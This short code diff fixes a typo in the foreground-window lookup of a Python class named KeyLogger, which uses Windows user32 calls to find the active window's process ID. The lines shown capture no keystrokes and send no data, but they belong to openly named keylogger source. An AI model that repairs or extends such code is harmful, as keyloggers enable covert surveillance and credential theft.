@@ -14,7 +14,7 @@ class KeyLogger:
         self.current_window = None
 
     def get_current_process(self):
-        hwnd = windll.user32l.GetForegroundWindow()
+        hwnd = windll.user32.GetForegroundWindow()
         pid = c_ulong(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f"{pid.value}"
